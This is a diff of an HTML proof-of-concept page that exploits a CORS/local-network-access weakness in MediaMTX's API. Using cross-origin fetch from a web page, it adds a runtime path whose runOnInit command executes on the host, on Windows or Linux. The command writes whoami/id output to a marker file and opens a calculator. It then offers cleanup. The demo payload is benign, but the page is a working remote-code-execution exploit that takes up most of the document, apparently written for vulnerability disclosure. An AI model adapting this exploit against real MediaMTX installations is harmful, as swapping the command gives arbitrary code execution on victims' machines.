@@ -3,47 +3,109 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>MediaMTX CORS/LNA bounded runOnInit proof</title>
+  <title>MediaMTX CORS/LNA bounded RCE proof</title>
   <style>
-    body { font-family: system-ui, sans-serif; max-width: 900px; margin: 40px auto; padding: 0 16px; }
-    input { width: 100%; box-sizing: border-box; padding: 8px; margin: 6px 0 12px; }
-    button { margin: 6px 8px 6px 0; padding: 8px 12px; }
-    pre { white-space: pre-wrap; background: #f4f4f4; padding: 12px; border-radius: 6px; }
-    code { word-break: break-all; }
+    body {
+      font-family: system-ui, sans-serif;
+      max-width: 920px;
+      margin: 40px auto;
+      padding: 0 16px;
+      line-height: 1.5;
+    }
+    label { display: block; margin-top: 12px; font-weight: 600; }
+    input, select {
+      width: 100%;
+      box-sizing: border-box;
+      padding: 8px;
+      margin-top: 6px;
+    }
+    button {
+      margin: 10px 8px 10px 0;
+      padding: 8px 12px;
+    }
+    pre {
+      white-space: pre-wrap;
+      word-break: break-word;
+      background: #f4f4f4;
+      padding: 12px;
+      border-radius: 6px;
+    }
+    .note {
+      border-left: 4px solid #777;
+      padding-left: 12px;
+      margin: 16px 0;
+    }
   </style>
 </head>
 <body>
-  <h1>MediaMTX CORS/LNA bounded runOnInit proof</h1>
-  <p>
-    Disposable local lab only. This test adds one temporary runtime path whose
-    <code>runOnInit</code> writes a marker/identity file into <code>%TEMP%</code>
-    and opens Calculator. It does not modify mediamtx.yml.
+  <h1>MediaMTX CORS/LNA bounded RCE proof</h1>
+
+  <p class="note">
+    Disposable local lab only. The test adds one temporary runtime path with
+    <code>runOnInit</code>. The command writes an identity marker and then
+    attempts to launch a calculator. It does not modify <code>mediamtx.yml</code>.
   </p>
 
-  <label>
-    API base
-    <input id="base" value="http://localhost:19997/v3">
-  </label>
+  <label for="base">API base</label>
+  <input id="base" value="http://localhost:19997/v3">
 
-  <p><strong>Command:</strong></p>
+  <label for="os">Target OS</label>
+  <select id="os">
+    <option value="windows">Windows</option>
+    <option value="linux">Linux</option>
+  </select>
+
+  <p><strong>Command preview:</strong></p>
   <pre id="cmd"></pre>
 
   <button id="run">1. Add temporary path and execute</button>
   <button id="cleanup">2. Delete temporary path</button>
 
+  <p><strong>Result:</strong></p>
   <pre id="out"></pre>
 
 <script>
 const out = document.getElementById("out");
 const baseInput = document.getElementById("base");
-const command =
-  'cmd /c "whoami > %TEMP%\\mediamtx-cors-rce-poc.txt & ' +
-  'echo MEDIAMTX_CORS_RCE_POC>>%TEMP%\\mediamtx-cors-rce-poc.txt & ' +
-  'start calc.exe & timeout /t 10 >nul"';
-
-document.getElementById("cmd").textContent = command;
+const osSelect = document.getElementById("os");
+const cmdPreview = document.getElementById("cmd");
 
 let pathName = null;
+
+function detectOS() {
+  const ua = navigator.userAgent.toLowerCase();
+  if (ua.includes("linux") && !ua.includes("android")) {
+    osSelect.value = "linux";
+  } else {
+    osSelect.value = "windows";
+  }
+}
+
+function commandFor(os) {
+  if (os === "linux") {
+    return "sh -c 'id > /tmp/mediamtx-cors-rce-linux.txt; " +
+      "echo MEDIAMTX_CORS_RCE_LINUX >> /tmp/mediamtx-cors-rce-linux.txt; " +
+      "if command -v gnome-calculator >/dev/null 2>&1; then exec gnome-calculator; " +
+      "elif command -v kcalc >/dev/null 2>&1; then exec kcalc; " +
+      "elif command -v xcalc >/dev/null 2>&1; then exec xcalc; " +
+      "else sleep 15; fi'";
+  }
+
+  return 'cmd /c "whoami > %TEMP%\\mediamtx-cors-rce-windows.txt & ' +
+    'echo MEDIAMTX_CORS_RCE_WINDOWS>>%TEMP%\\mediamtx-cors-rce-windows.txt & ' +
+    'calc.exe"';
+}
+
+function markerFor(os) {
+  if (os === "linux") {
+    return "/tmp/mediamtx-cors-rce-linux.txt";
+  }
+  return "%TEMP%\\mediamtx-cors-rce-windows.txt";
+}
+
+function updatePreview() {
+  cmdPreview.textContent = commandFor(osSelect.value);
+}
 
 function write(v) {
   out.textContent += (typeof v === "string" ? v : JSON.stringify(v, null, 2)) + "\n";
@@ -52,6 +114,7 @@ function write(v) {
 async function req(path, options = {}) {
   const base = baseInput.value.replace(/\/+$/, "");
   const url = base + path;
+
   const opts = {
     mode: "cors",
     credentials: "omit",
@@ -64,14 +127,24 @@ async function req(path, options = {}) {
   try {
     const r = await fetch(url, opts);
     const text = await r.text();
+
     let body = text;
     try { body = JSON.parse(text); } catch (_) {}
 
-    const result = { ok: r.ok, status: r.status, body };
+    const result = {
+      ok: r.ok,
+      status: r.status,
+      body
+    };
+
     write(result);
     return result;
   } catch (e) {
-    const result = { fetchRejected: true, name: e.name, message: e.message };
+    const result = {
+      fetchRejected: true,
+      name: e.name,
+      message: e.message
+    };
     write(result);
     throw e;
   }
@@ -79,13 +152,19 @@ async function req(path, options = {}) {
 
 document.getElementById("run").onclick = async () => {
   out.textContent = "";
+
+  const os = osSelect.value;
+  const command = commandFor(os);
+  const marker = markerFor(os);
+
   write({
     pageOrigin: location.origin,
     isSecureContext: window.isSecureContext,
     userAgent: navigator.userAgent,
+    selectedTargetOS: os
   });
 
-  pathName = "cors-rce-poc-" + Date.now();
+  pathName = `cors-rce-poc-${os}-${Date.now()}`;
 
   const body = {
     runOnInit: command,
@@ -104,9 +183,18 @@ document.getElementById("run").onclick = async () => {
     }
 
     write(`PATH: ${pathName}`);
-    write("EXPECTED FILE: %TEMP%\\mediamtx-cors-rce-poc.txt");
-    write("EXPECTED VISIBLE EFFECT: Calculator opens.");
-    write("Check the MediaMTX console for a runOnInit command-start message.");
+    write(`EXPECTED MARKER: ${marker}`);
+
+    if (os === "windows") {
+      write("EXPECTED VISIBLE EFFECT: Windows Calculator should open if the MediaMTX session can display GUI applications.");
+      write('VERIFY: Get-Content "$env:TEMP\\mediamtx-cors-rce-windows.txt"');
+    } else {
+      write("EXPECTED VISIBLE EFFECT: gnome-calculator, kcalc, or xcalc is attempted if installed and a GUI session is available.");
+      write("VERIFY: cat /tmp/mediamtx-cors-rce-linux.txt");
+    }
+
+    write("Check the MediaMTX console for: runOnInit command started");
+    write("The marker file is the authoritative command-execution proof; GUI launch is only a visible secondary effect.");
   } catch (e) {
     write(`RESULT: failed: ${e.message}`);
   }
@@ -114,7 +202,7 @@ document.getElementById("run").onclick = async () => {
 
 document.getElementById("cleanup").onclick = async () => {
   if (!pathName) {
-    write("No path created in this page session.");
+    write("No runtime path was created in this page session.");
     return;
   }
 
@@ -122,13 +210,22 @@ document.getElementById("cleanup").onclick = async () => {
     const r = await req("/config/paths/delete/" + encodeURIComponent(pathName), {
       method: "DELETE",
     });
-    if (!r.ok) throw new Error(`path delete failed: HTTP ${r.status}`);
+
+    if (!r.ok) {
+      throw new Error(`path delete failed: HTTP ${r.status}`);
+    }
+
     write(`Deleted runtime path: ${pathName}`);
     pathName = null;
   } catch (e) {
     write(`Cleanup failed: ${e.message}`);
   }
 };
+
+osSelect.addEventListener("change", updatePreview);
+
+detectOS();
+updatePreview();
 </script>
 </body>
 </html>
